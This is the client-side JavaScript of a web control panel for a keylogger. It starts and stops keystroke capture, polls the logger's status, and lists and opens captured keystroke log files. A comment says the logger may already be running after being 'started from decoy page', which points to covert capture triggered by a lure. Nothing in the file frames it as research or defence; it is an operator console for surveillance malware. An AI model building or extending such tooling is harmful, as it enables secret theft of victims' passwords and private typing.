// API Base URL - Automatically detects the host (works for localhost and network IP)
const API_URL = window.location.origin;

// DOM Elements
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const refreshBtn = document.getElementById('refreshBtn');
const intervalInput = document.getElementById('interval');
const statusText = document.getElementById('statusText');
const startTime = document.getElementById('startTime');
const bufferSize = document.getElementById('bufferSize');
const sessionLogs = document.getElementById('sessionLogs');
const logsContainer = document.getElementById('logsContainer');
const globalStatus = document.getElementById('globalStatus');
const alertContainer = document.getElementById('alertContainer');

// Update interval for polling status
let statusUpdateInterval = null;

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    loadLogs();
    updateStatus();
    checkInitialStatus(); // Check if keylogger is already running
});

// Check initial keylogger status and update UI accordingly
async function checkInitialStatus() {
    try {
        const response = await fetch(`${API_URL}/api/status`);
        const data = await response.json();

        if (data.is_running) {
            // Keylogger is already running (started from decoy page)
            startBtn.disabled = true;
            stopBtn.disabled = false;
            intervalInput.disabled = true;

            // Start status updates
            if (!statusUpdateInterval) {
                statusUpdateInterval = setInterval(updateStatus, 2000);
            }

            console.log('✅ Keylogger already running in background');
        }
    } catch (error) {
        console.error('Error checking initial status:', error);
    }
}

// Show Alert
function showAlert(message, type = 'success') {
    const alert = document.createElement('div');
    alert.className = `alert alert-${type}`;

    const icon = type === 'success'
        ? `<svg class="alert-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>`
        : `<svg class="alert-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
             <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
             <circle cx="12" cy="16" r="1" fill="currentColor"/>
           </svg>`;

    alert.innerHTML = `${icon}<span>${message}</span>`;
    alertContainer.appendChild(alert);

    setTimeout(() => {
        alert.style.animation = 'slideInRight 0.3s ease-out reverse';
        setTimeout(() => alert.remove(), 300);
    }, 3000);
}

// Start Logging
startBtn.addEventListener('click', async () => {
    const interval = parseInt(intervalInput.value);

    if (interval < 10) {
        showAlert('Interval must be at least 10 seconds', 'error');
        return;
    }

    try {
        const response = await fetch(`${API_URL}/api/start`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ interval })
        });

        const data = await response.json();

        if (data.status === 'success') {
            showAlert('Keylogger started successfully');
            startBtn.disabled = true;
            stopBtn.disabled = false;
            intervalInput.disabled = true;

            // Start status updates
            statusUpdateInterval = setInterval(updateStatus, 2000);
            updateStatus();
        } else {
            // Handle error - keylogger might already be running
            showAlert(data.message, 'error');

            // Check actual status and sync UI
            const statusResponse = await fetch(`${API_URL}/api/status`);
            const statusData = await statusResponse.json();

            if (statusData.is_running) {
                // It's actually running, update UI to reflect this
                startBtn.disabled = true;
                stopBtn.disabled = false;
                intervalInput.disabled = true;

                if (!statusUpdateInterval) {
                    statusUpdateInterval = setInterval(updateStatus, 2000);
                }

                showAlert('Keylogger is already running', 'error');
            }
        }
    } catch (error) {
        showAlert('Failed to start keylogger', 'error');
        console.error('Error:', error);
    }
});

// Stop Logging
stopBtn.addEventListener('click', async () => {
    try {
        const response = await fetch(`${API_URL}/api/stop`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const data = await response.json();

        if (data.status === 'success') {
            showAlert('Keylogger stopped successfully');
            startBtn.disabled = false;
            stopBtn.disabled = true;
            intervalInput.disabled = false;

            // Stop status updates
            if (statusUpdateInterval) {
                clearInterval(statusUpdateInterval);
                statusUpdateInterval = null;
            }

            updateStatus();
            loadLogs();
        } else {
            showAlert(data.message, 'error');
        }
    } catch (error) {
        showAlert('Failed to stop keylogger', 'error');
        console.error('Error:', error);
    }
});

// Refresh Logs
refreshBtn.addEventListener('click', () => {
    loadLogs();
    showAlert('Logs refreshed');
});

// Update Status
async function updateStatus() {
    try {
        const response = await fetch(`${API_URL}/api/status`);
        const data = await response.json();

        // Update status text
        if (data.is_running) {
            statusText.textContent = 'Active';
            statusText.style.color = 'var(--primary)';
            globalStatus.classList.add('active');
            globalStatus.querySelector('span').textContent = 'ACTIVE';
        } else {
            statusText.textContent = 'Inactive';
            statusText.style.color = 'var(--text-secondary)';
            globalStatus.classList.remove('active');
            globalStatus.querySelector('span').textContent = 'STANDBY';
        }

        // Update start time
        if (data.start_time) {
            startTime.textContent = formatTime(data.start_time);
        } else {
            startTime.textContent = '--:--:--';
        }

        // Update buffer size
        bufferSize.textContent = data.current_buffer.toLocaleString();

        // Update session logs count
        sessionLogs.textContent = data.session_logs ? data.session_logs.length : 0;

    } catch (error) {
        console.error('Error updating status:', error);
    }
}

// Load Logs
async function loadLogs() {
    try {
        const response = await fetch(`${API_URL}/api/logs`);
        const logs = await response.json();

        if (logs.length === 0) {
            logsContainer.innerHTML = `
                <div class="empty-state">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 11L12 14L22 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M21 12V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                    <p>No logs captured yet</p>
                    <span>Start logging to capture keystrokes</span>
                </div>
            `;
            return;
        }

        logsContainer.innerHTML = logs.map(log => `
            <div class="log-item" onclick="viewLog('${log.filename}')">
                <div class="log-header">
                    <span class="log-filename">${log.filename}</span>
                    <span class="log-size">${formatBytes(log.size)}</span>
                </div>
                <div class="log-meta">
                    <span>📅 ${log.modified}</span>
                </div>
            </div>
        `).join('');

    } catch (error) {
        console.error('Error loading logs:', error);
        showAlert('Failed to load logs', 'error');
    }
}

// View Log Content
async function viewLog(filename) {
    try {
        const response = await fetch(`${API_URL}/api/logs/${filename}`);
        const data = await response.json();

        if (data.status === 'success') {
            // Create modal to show log content
            const modal = document.createElement('div');
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 2000;
                padding: 2rem;
            `;

            modal.innerHTML = `
                <div style="
                    background: var(--bg-card);
                    border: 1px solid var(--border);
                    border-radius: 16px;
                    padding: 2rem;
                    max-width: 800px;
                    width: 100%;
                    max-height: 80vh;
                    overflow: auto;
                    position: relative;
                ">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
                        <h3 style="font-family: 'Orbitron', sans-serif; color: var(--primary);">${filename}</h3>
                        <button onclick="this.closest('[style*=fixed]').remove()" style="
                            background: var(--danger);
                            border: none;
                            color: white;
                            width: 32px;
                            height: 32px;
                            border-radius: 50%;
                            cursor: pointer;
                            font-size: 1.5rem;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                        ">×</button>
                    </div>
                    <pre style="
                        background: rgba(0, 0, 0, 0.3);
                        padding: 1.5rem;
                        border-radius: 8px;
                        overflow-x: auto;
                        white-space: pre-wrap;
                        word-wrap: break-word;
                        font-family: 'JetBrains Mono', monospace;
                        font-size: 0.875rem;
                        line-height: 1.6;
                        color: var(--text-primary);
                    ">${escapeHtml(data.content)}</pre>
                </div>
            `;

            document.body.appendChild(modal);

            // Close on background click
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.remove();
                }
            });
        } else {
            showAlert('Failed to load log content', 'error');
        }
    } catch (error) {
        console.error('Error viewing log:', error);
        showAlert('Failed to view log', 'error');
    }
}

// Utility Functions
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

function formatTime(timeStr) {
    const date = new Date(timeStr);
    return date.toLocaleTimeString();
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}